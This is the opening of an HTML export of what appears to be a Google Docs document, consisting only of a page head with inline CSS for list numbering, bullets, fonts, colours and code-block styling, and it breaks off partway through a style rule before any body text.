<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=4mNYFHt_IKFsPe52toizH4p83mgBAhLHyHAPxI1dyqRxQrWfGkuQc6DuI-XUnmCm');.lst-kix_cc5tud1vde9p-1>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-1}.lst-kix_d90m61m618oa-5>li{counter-increment:lst-ctn-kix_d90m61m618oa-5}.lst-kix_vtzauvtbouvm-0>li:before{content:"\0025cf  "}.lst-kix_vtzauvtbouvm-1>li:before{content:"\0025cb  "}.lst-kix_j6urpnclzr2v-0>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-0}.lst-kix_vtzauvtbouvm-2>li:before{content:"\0025a0  "}ol.lst-kix_afphhjvhkxq-0.start{counter-reset:lst-ctn-kix_afphhjvhkxq-0 0}.lst-kix_vtzauvtbouvm-4>li:before{content:"\0025cb  "}.lst-kix_vtzauvtbouvm-5>li:before{content:"\0025a0  "}.lst-kix_vtzauvtbouvm-3>li:before{content:"\0025cf  "}ol.lst-kix_cc5tud1vde9p-7{list-style-type:none}.lst-kix_vtzauvtbouvm-8>li:before{content:"\0025a0  "}ol.lst-kix_cc5tud1vde9p-6{list-style-type:none}.lst-kix_3suwmg6ak374-5>li{counter-increment:lst-ctn-kix_3suwmg6ak374-5}ol.lst-kix_cc5tud1vde9p-5{list-style-type:none}ol.lst-kix_cc5tud1vde9p-4{list-style-type:none}.lst-kix_j6urpnclzr2v-2>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-2}.lst-kix_d90m61m618oa-3>li{counter-increment:lst-ctn-kix_d90m61m618oa-3}.lst-kix_7jxhi2va7kgl-1>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-1}.lst-kix_vtzauvtbouvm-6>li:before{content:"\0025cf  "}ol.lst-kix_cc5tud1vde9p-8{list-style-type:none}ol.lst-kix_j6urpnclzr2v-5.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-5 0}ol.lst-kix_cc5tud1vde9p-3{list-style-type:none}.lst-kix_vtzauvtbouvm-7>li:before{content:"\0025cb  "}ol.lst-kix_cc5tud1vde9p-2{list-style-type:none}ol.lst-kix_cc5tud1vde9p-1{list-style-type:none}ol.lst-kix_cc5tud1vde9p-0{list-style-type:none}.lst-kix_afphhjvhkxq-7>li{counter-increment:lst-ctn-kix_afphhjvhkxq-7}ol.lst-kix_7jxhi2va7kgl-2.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-2 0}ol.lst-kix_7jxhi2va7kgl-8.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-8 0}ol.lst-kix_3suwmg6ak374-5.start{counter-reset:lst-ctn-kix_3suwmg6ak374-5 0}.lst-kix_7jxhi2va7kgl-5>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-5}ol.lst-kix_d90m61m618oa-2.start{counter-reset:lst-ctn-kix_d90m61m618oa-2 0}ol.lst-kix_d90m61m618oa-6.start{counter-reset:lst-ctn-kix_d90m61m618oa-6 0}.lst-kix_d90m61m618oa-1>li{counter-increment:lst-ctn-kix_d90m61m618oa-1}ol.lst-kix_3suwmg6ak374-6.start{counter-reset:lst-ctn-kix_3suwmg6ak374-6 0}ol.lst-kix_cc5tud1vde9p-4.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-4 0}ol.lst-kix_3suwmg6ak374-1{list-style-type:none}ol.lst-kix_3suwmg6ak374-2{list-style-type:none}.lst-kix_d90m61m618oa-7>li{counter-increment:lst-ctn-kix_d90m61m618oa-7}ol.lst-kix_3suwmg6ak374-0{list-style-type:none}ol.lst-kix_3suwmg6ak374-5{list-style-type:none}.lst-kix_cc5tud1vde9p-3>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-3}ol.lst-kix_afphhjvhkxq-5.start{counter-reset:lst-ctn-kix_afphhjvhkxq-5 0}ol.lst-kix_3suwmg6ak374-6{list-style-type:none}ol.lst-kix_3suwmg6ak374-3{list-style-type:none}ol.lst-kix_3suwmg6ak374-4{list-style-type:none}ol.lst-kix_3suwmg6ak374-7{list-style-type:none}ol.lst-kix_3suwmg6ak374-8{list-style-type:none}ol.lst-kix_j6urpnclzr2v-0.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-0 0}.lst-kix_afphhjvhkxq-2>li{counter-increment:lst-ctn-kix_afphhjvhkxq-2}ol.lst-kix_cc5tud1vde9p-5.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-5 0}.lst-kix_afphhjvhkxq-5>li{counter-increment:lst-ctn-kix_afphhjvhkxq-5}ol.lst-kix_d90m61m618oa-1.start{counter-reset:lst-ctn-kix_d90m61m618oa-1 0}ol.lst-kix_d90m61m618oa-7.start{counter-reset:lst-ctn-kix_d90m61m618oa-7 0}ol.lst-kix_7jxhi2va7kgl-3.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-3 0}.lst-kix_3suwmg6ak374-7>li{counter-increment:lst-ctn-kix_3suwmg6ak374-7}.lst-kix_3suwmg6ak374-1>li{counter-increment:lst-ctn-kix_3suwmg6ak374-1}ol.lst-kix_afphhjvhkxq-6.start{counter-reset:lst-ctn-kix_afphhjvhkxq-6 0}ol.lst-kix_3suwmg6ak374-0.start{counter-reset:lst-ctn-kix_3suwmg6ak374-0 0}ol.lst-kix_j6urpnclzr2v-6.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-6 0}.lst-kix_j6urpnclzr2v-4>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-4,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-7{list-style-type:none}.lst-kix_cc5tud1vde9p-7>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-7}ol.lst-kix_j6urpnclzr2v-8{list-style-type:none}ol.lst-kix_afphhjvhkxq-4.start{counter-reset:lst-ctn-kix_afphhjvhkxq-4 0}.lst-kix_afphhjvhkxq-5>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-5,lower-roman) ". "}.lst-kix_afphhjvhkxq-7>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-7,lower-latin) ". "}.lst-kix_j6urpnclzr2v-2>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-2,lower-roman) ". "}ol.lst-kix_j6urpnclzr2v-3{list-style-type:none}.lst-kix_j6urpnclzr2v-6>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-6,decimal) ". "}ol.lst-kix_cc5tud1vde9p-6.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-6 0}ol.lst-kix_j6urpnclzr2v-4{list-style-type:none}ol.lst-kix_j6urpnclzr2v-5{list-style-type:none}ol.lst-kix_j6urpnclzr2v-6{list-style-type:none}.lst-kix_j6urpnclzr2v-0>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-0,decimal) ". "}.lst-kix_j6urpnclzr2v-8>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-8,lower-roman) ". "}ol.lst-kix_j6urpnclzr2v-0{list-style-type:none}ol.lst-kix_j6urpnclzr2v-1{list-style-type:none}.lst-kix_afphhjvhkxq-1>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-1,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-2{list-style-type:none}.lst-kix_cc5tud1vde9p-4>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-4,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-8>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-8}.lst-kix_cc5tud1vde9p-2>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-2,lower-roman) ". "}.lst-kix_3suwmg6ak374-2>li{counter-increment:lst-ctn-kix_3suwmg6ak374-2}ol.lst-kix_d90m61m618oa-3.start{counter-reset:lst-ctn-kix_d90m61m618oa-3 0}.lst-kix_cc5tud1vde9p-0>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-0,decimal) ". "}ol.lst-kix_j6urpnclzr2v-7.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-7 0}ol.lst-kix_d90m61m618oa-5.start{counter-reset:lst-ctn-kix_d90m61m618oa-5 0}.lst-kix_452ui7xkw1cj-1>li:before{content:"\0025cb  "}.lst-kix_j6urpnclzr2v-5>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-5}.lst-kix_d90m61m618oa-0>li{counter-increment:lst-ctn-kix_d90m61m618oa-0}ul.lst-kix_vtzauvtbouvm-3{list-style-type:none}ul.lst-kix_vtzauvtbouvm-2{list-style-type:none}.lst-kix_3suwmg6ak374-4>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-4,lower-latin) ". "}ul.lst-kix_vtzauvtbouvm-1{list-style-type:none}ul.lst-kix_vtzauvtbouvm-0{list-style-type:none}ul.lst-kix_vtzauvtbouvm-7{list-style-type:none}ul.lst-kix_vtzauvtbouvm-6{list-style-type:none}ul.lst-kix_vtzauvtbouvm-5{list-style-type:none}ul.lst-kix_vtzauvtbouvm-4{list-style-type:none}.lst-kix_3suwmg6ak374-6>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-6,decimal) ". "}.lst-kix_3suwmg6ak374-8>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-8,lower-roman) ". "}ul.lst-kix_vtzauvtbouvm-8{list-style-type:none}.lst-kix_afphhjvhkxq-3>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-3,decimal) ". "}.lst-kix_afphhjvhkxq-1>li{counter-increment:lst-ctn-kix_afphhjvhkxq-1}ol.lst-kix_afphhjvhkxq-1.start{counter-reset:lst-ctn-kix_afphhjvhkxq-1 0}ol.lst-kix_d90m61m618oa-3{list-style-type:none}ol.lst-kix_d90m61m618oa-2{list-style-type:none}ol.lst-kix_d90m61m618oa-1{list-style-type:none}ol.lst-kix_d90m61m618oa-0{list-style-type:none}ol.lst-kix_d90m61m618oa-7{list-style-type:none}ol.lst-kix_d90m61m618oa-6{list-style-type:none}ol.lst-kix_d90m61m618oa-5{list-style-type:none}ol.lst-kix_d90m61m618oa-4{list-style-type:none}ol.lst-kix_cc5tud1vde9p-8.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-8 0}.lst-kix_3suwmg6ak374-3>li{counter-increment:lst-ctn-kix_3suwmg6ak374-3}.lst-kix_452ui7xkw1cj-7>li:before{content:"\0025cb  "}.lst-kix_afphhjvhkxq-0>li{counter-increment:lst-ctn-kix_afphhjvhkxq-0}ol.lst-kix_7jxhi2va7kgl-7.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-7 0}.lst-kix_452ui7xkw1cj-5>li:before{content:"\0025a0  "}.lst-kix_3suwmg6ak374-2>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-2,lower-roman) ". "}ol.lst-kix_afphhjvhkxq-2.start{counter-reset:lst-ctn-kix_afphhjvhkxq-2 0}.lst-kix_afphhjvhkxq-6>li{counter-increment:lst-ctn-kix_afphhjvhkxq-6}.lst-kix_3suwmg6ak374-0>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-0,decimal) ". "}ol.lst-kix_d90m61m618oa-8{list-style-type:none}.lst-kix_452ui7xkw1cj-3>li:before{content:"\0025cf  "}ol.lst-kix_cc5tud1vde9p-7.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-7 0}ol.lst-kix_afphhjvhkxq-3.start{counter-reset:lst-ctn-kix_afphhjvhkxq-3 0}ol.lst-kix_7jxhi2va7kgl-6.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-6 0}.lst-kix_cc5tud1vde9p-6>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-6,decimal) ". "}.lst-kix_7jxhi2va7kgl-3>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-3}.lst-kix_cc5tud1vde9p-2>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-2}ul.lst-kix_452ui7xkw1cj-1{list-style-type:none}ul.lst-kix_452ui7xkw1cj-2{list-style-type:none}.lst-kix_cc5tud1vde9p-8>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-8,lower-roman) ". "}ul.lst-kix_452ui7xkw1cj-0{list-style-type:none}ul.lst-kix_452ui7xkw1cj-5{list-style-type:none}.lst-kix_j6urpnclzr2v-4>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-4}ul.lst-kix_452ui7xkw1cj-6{list-style-type:none}ul.lst-kix_452ui7xkw1cj-3{list-style-type:none}ul.lst-kix_452ui7xkw1cj-4{list-style-type:none}.lst-kix_cc5tud1vde9p-8>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-8}ul.lst-kix_452ui7xkw1cj-7{list-style-type:none}ul.lst-kix_452ui7xkw1cj-8{list-style-type:none}ol.lst-kix_d90m61m618oa-4.start{counter-reset:lst-ctn-kix_d90m61m618oa-4 0}.lst-kix_d90m61m618oa-3>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-3,decimal) ". "}.lst-kix_d90m61m618oa-5>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-5,lower-roman) ". "}.lst-kix_7jxhi2va7kgl-2>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-2}.lst-kix_d90m61m618oa-0>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-0,decimal) ". "}.lst-kix_d90m61m618oa-4>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-4,lower-latin) ". "}.lst-kix_d90m61m618oa-7>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-7,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-8.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-8 0}.lst-kix_d90m61m618oa-6>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-6,decimal) ". "}.lst-kix_d90m61m618oa-8>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-8,lower-roman) ". "}ol.lst-kix_cc5tud1vde9p-2.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-2 0}.lst-kix_3suwmg6ak374-6>li{counter-increment:lst-ctn-kix_3suwmg6ak374-6}.lst-kix_cc5tud1vde9p-0>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-0}.lst-kix_d90m61m618oa-4>li{counter-increment:lst-ctn-kix_d90m61m618oa-4}.lst-kix_d90m61m618oa-6>li{counter-increment:lst-ctn-kix_d90m61m618oa-6}ol.lst-kix_3suwmg6ak374-2.start{counter-reset:lst-ctn-kix_3suwmg6ak374-2 0}ol.lst-kix_afphhjvhkxq-8.start{counter-reset:lst-ctn-kix_afphhjvhkxq-8 0}.lst-kix_3suwmg6ak374-8>li{counter-increment:lst-ctn-kix_3suwmg6ak374-8}.lst-kix_7jxhi2va7kgl-4>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-4}ol.lst-kix_3suwmg6ak374-8.start{counter-reset:lst-ctn-kix_3suwmg6ak374-8 0}.lst-kix_d90m61m618oa-1>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-1,lower-latin) ". "}ol.lst-kix_7jxhi2va7kgl-5.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-5 0}.lst-kix_d90m61m618oa-2>li:before{content:"" counter(lst-ctn-kix_d90m61m618oa-2,lower-roman) ". "}.lst-kix_cc5tud1vde9p-4>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-4}.lst-kix_7jxhi2va7kgl-0>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-0,decimal) ". "}.lst-kix_7jxhi2va7kgl-1>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-1,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-2>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-2,lower-roman) ". "}.lst-kix_7jxhi2va7kgl-3>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-3,decimal) ". "}.lst-kix_7jxhi2va7kgl-4>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-4,lower-latin) ". "}ol.lst-kix_3suwmg6ak374-7.start{counter-reset:lst-ctn-kix_3suwmg6ak374-7 0}.lst-kix_j6urpnclzr2v-3>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-3}ol.lst-kix_7jxhi2va7kgl-4.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-4 0}.lst-kix_7jxhi2va7kgl-7>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-7,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-5>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-5,lower-roman) ". "}.lst-kix_7jxhi2va7kgl-6>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-6,decimal) ". "}.lst-kix_7jxhi2va7kgl-8>li:before{content:"" counter(lst-ctn-kix_7jxhi2va7kgl-8,lower-roman) ". "}.lst-kix_afphhjvhkxq-8>li{counter-increment:lst-ctn-kix_afphhjvhkxq-8}.lst-kix_3suwmg6ak374-4>li{counter-increment:lst-ctn-kix_3suwmg6ak374-4}.lst-kix_j6urpnclzr2v-3>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-3,decimal) ". "}.lst-kix_j6urpnclzr2v-5>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-5,lower-roman) ". "}.lst-kix_afphhjvhkxq-2>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-2,lower-roman) ". "}.lst-kix_afphhjvhkxq-6>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-6,decimal) ". "}ol.lst-kix_7jxhi2va7kgl-5{list-style-type:none}ol.lst-kix_7jxhi2va7kgl-6{list-style-type:none}.lst-kix_afphhjvhkxq-3>li{counter-increment:lst-ctn-kix_afphhjvhkxq-3}ol.lst-kix_7jxhi2va7kgl-3{list-style-type:none}.lst-kix_j6urpnclzr2v-1>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-1,lower-latin) ". "}.lst-kix_j6urpnclzr2v-7>li:before{content:"" counter(lst-ctn-kix_j6urpnclzr2v-7,lower-latin) ". "}ol.lst-kix_7jxhi2va7kgl-4{list-style-type:none}.lst-kix_3suwmg6ak374-0>li{counter-increment:lst-ctn-kix_3suwmg6ak374-0}ol.lst-kix_7jxhi2va7kgl-1{list-style-type:none}ol.lst-kix_7jxhi2va7kgl-2{list-style-type:none}ol.lst-kix_j6urpnclzr2v-4.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-4 0}ol.lst-kix_7jxhi2va7kgl-0{list-style-type:none}.lst-kix_afphhjvhkxq-0>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-0,decimal) ". "}.lst-kix_afphhjvhkxq-8>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-8,lower-roman) ". "}ol.lst-kix_afphhjvhkxq-7.start{counter-reset:lst-ctn-kix_afphhjvhkxq-7 0}ol.lst-kix_7jxhi2va7kgl-7{list-style-type:none}ol.lst-kix_3suwmg6ak374-1.start{counter-reset:lst-ctn-kix_3suwmg6ak374-1 0}ol.lst-kix_7jxhi2va7kgl-8{list-style-type:none}.lst-kix_cc5tud1vde9p-3>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-3,decimal) ". "}.lst-kix_cc5tud1vde9p-6>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-6}ol.lst-kix_7jxhi2va7kgl-1.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-1 0}ol.lst-kix_d90m61m618oa-0.start{counter-reset:lst-ctn-kix_d90m61m618oa-0 0}.lst-kix_cc5tud1vde9p-1>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-1,lower-latin) ". "}.lst-kix_j6urpnclzr2v-6>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-6}ol.lst-kix_d90m61m618oa-8.start{counter-reset:lst-ctn-kix_d90m61m618oa-8 0}.lst-kix_j6urpnclzr2v-8>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-8}.lst-kix_7jxhi2va7kgl-7>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-7}.lst-kix_452ui7xkw1cj-0>li:before{content:"\0025cf  "}ol.lst-kix_cc5tud1vde9p-0.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-0 0}ol.lst-kix_cc5tud1vde9p-3.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-3 0}.lst-kix_3suwmg6ak374-5>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-5,lower-roman) ". "}.lst-kix_3suwmg6ak374-7>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-7,lower-latin) ". "}ol.lst-kix_j6urpnclzr2v-1.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-1 0}.lst-kix_afphhjvhkxq-4>li{counter-increment:lst-ctn-kix_afphhjvhkxq-4}.lst-kix_afphhjvhkxq-4>li:before{content:"" counter(lst-ctn-kix_afphhjvhkxq-4,lower-latin) ". "}ol.lst-kix_7jxhi2va7kgl-0.start{counter-reset:lst-ctn-kix_7jxhi2va7kgl-0 0}ol.lst-kix_3suwmg6ak374-3.start{counter-reset:lst-ctn-kix_3suwmg6ak374-3 0}ol.lst-kix_cc5tud1vde9p-1.start{counter-reset:lst-ctn-kix_cc5tud1vde9p-1 0}.lst-kix_d90m61m618oa-2>li{counter-increment:lst-ctn-kix_d90m61m618oa-2}.lst-kix_d90m61m618oa-8>li{counter-increment:lst-ctn-kix_d90m61m618oa-8}.lst-kix_452ui7xkw1cj-8>li:before{content:"\0025a0  "}.lst-kix_3suwmg6ak374-3>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-3,decimal) ". "}.lst-kix_452ui7xkw1cj-6>li:before{content:"\0025cf  "}.lst-kix_3suwmg6ak374-1>li:before{content:"" counter(lst-ctn-kix_3suwmg6ak374-1,lower-latin) ". "}ol.lst-kix_afphhjvhkxq-8{list-style-type:none}ol.lst-kix_afphhjvhkxq-7{list-style-type:none}.lst-kix_452ui7xkw1cj-2>li:before{content:"\0025a0  "}ol.lst-kix_afphhjvhkxq-6{list-style-type:none}ol.lst-kix_afphhjvhkxq-5{list-style-type:none}ol.lst-kix_afphhjvhkxq-4{list-style-type:none}ol.lst-kix_afphhjvhkxq-3{list-style-type:none}ol.lst-kix_j6urpnclzr2v-2.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-2 0}.lst-kix_452ui7xkw1cj-4>li:before{content:"\0025cb  "}ol.lst-kix_afphhjvhkxq-2{list-style-type:none}ol.lst-kix_afphhjvhkxq-1{list-style-type:none}ol.lst-kix_afphhjvhkxq-0{list-style-type:none}ol.lst-kix_3suwmg6ak374-4.start{counter-reset:lst-ctn-kix_3suwmg6ak374-4 0}.lst-kix_cc5tud1vde9p-5>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-5,lower-roman) ". "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_cc5tud1vde9p-7>li:before{content:"" counter(lst-ctn-kix_cc5tud1vde9p-7,lower-latin) ". "}.lst-kix_7jxhi2va7kgl-0>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-0}ol.lst-kix_j6urpnclzr2v-3.start{counter-reset:lst-ctn-kix_j6urpnclzr2v-3 0}.lst-kix_cc5tud1vde9p-5>li{counter-increment:lst-ctn-kix_cc5tud1vde9p-5}.lst-kix_7jxhi2va7kgl-6>li{counter-increment:lst-ctn-kix_7jxhi2va7kgl-6}.lst-kix_j6urpnclzr2v-7>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-7}.lst-kix_j6urpnclzr2v-1>li{counter-increment:lst-ctn-kix_j6urpnclzr2v-1}ol{margin:0;padding:0}table td,table th{padding:0}.c2{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;background-color:#22221b;border-left-style:solid;border-bottom-width:0pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c31{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:234pt;border-top-color:#000000;border-bottom-style:solid}.c67{padding-top:20pt;border-bottom-color:#000000;border-bottom-width:1pt;padding-bottom:2pt;line-height:1.5;border-bottom-style:solid;page-break-after:avoid;text-align:left}.c21{margin-left:18pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c11{padding-top:8pt;padding-bottom:2pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c19{padding-top:20pt;padding-bottom:3pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c26{margin-left:54pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c13{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c30{margin-left:36pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c20{padding-top:0pt;padding-bottom:0pt;line-height:0.6;orphans:2;widows:2;text-align:left;height:11pt}.c15{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Roboto Mono";font-style:normal}.c9{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c60{color:#000000;font-weight:400;text-decoration:none;font-size:11pt;font-family:"Arial";font-style:normal}.c27{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-family:"Arial";font-style:normal}.c12{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c32{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-family:"Arial";font-style:italic}.c46{color:#0b5394;text-decoration:none;vertical-align:baseline;font-size:17pt;font-style:normal}.c37{margin-left:72pt;padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c40{padding-top:0pt;padding-bottom:0pt;line-height:0.06;text-align:left;height:11pt}.c48{color:#0c343d;text-decoration:none;vertical-align:baseline;font-size:16pt;font-style:normal}.c25{color:#516d7b;text-decoration:none;vertical-align:baseline;font-size:15pt;font-style:normal}.c62{color:#0c343d;text-decoration:none;vertical-align:baseline;font-size:18pt;font-style:normal}.c41{font-weight:400;text-decoration:none;vertical-align:baseline;font-size:18pt;font-style:normal}.c65{margin-left:72pt;padding-top:3pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c49{color:#980000;text-decoration:none;vertical-align:baseline;font-size:42pt;font-style:normal}.c44{color:#936ec1;text-decoration:none;vertical-align:baseline;font-size:12.5pt;font-style:normal}.c14{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c52{background-color:#22221b;color:#929181;font-size:11pt;font-family:"Consolas"}.c85{padding-top:2pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c51{font-weight:400;text-decoration:none;vertical-align:baseline;font-style:normal}.c53{padding-top:10pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c5{border-spacing:0;border-collapse:collapse;margin-right:auto}.c54{padding-top:10pt;padding-bottom:0pt;line-height:1.5;text-align:center}.c24{background-color:#22221b;font-family:"Consolas";color:#36a166;font-weight:400}.c86{padding-top:0pt;padding-bottom:3pt;line-height:1.5;text-align:left}.c34{-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline;text-decoration-skip-ink:none}.c55{text-decoration:none;vertical-align:baseline;font-size:12pt;font-style:normal}.c38{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.15;text-align:left}.c82{padding-top:0pt;padding-bottom:0pt;line-height:0.6;text-align:left}.c4{background-color:#22221b;font-family:"Consolas";color:#ae7313;font-weight:400}.c28{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:center}.c47{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.c3{background-color:#22221b;font-family:"Consolas";color:#ba6236;font-weight:400}.c23{text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c8{background-color:#22221b;font-family:"Consolas";color:#929181;font-weight:400}.c79{color:#666666;text-decoration:none;vertical-align:baseline;font-size:16pt}.c58{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right}.c7{background-color:#22221b;font-family:"Consolas";color:#5f9182;font-weight:400}.c64{padding-top:10pt;padding-bottom:4pt;line-height:1.0;text-align:left}.c17{background-color:#22221b;font-family:"Consolas";color:#878573;font-weight:400}.c72{padding-top:4pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c0{background-color:#22221b;font-family:"Consolas";color:#7d9726;font-weight:400}.c70{padding-top:6pt;padding-bottom:0pt;line-height:1.5;text-align:center}.c57{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c66{font-size:18pt;color:#000000;font-weight:400}.c73{color:#741b47;font-size:15pt;font-family:"Arial"}.c81{width:33%;height:1px}.c18{padding:0;margin:0}.c36{orphans:2;widows:2}.c6{color:inherit;text-decoration:inherit}.c69{color:#000000;font-family:"Arial"}.c33{color:#000000;font-family:"Roboto Mono"}.c22{font-weight:400;font-family:"Roboto 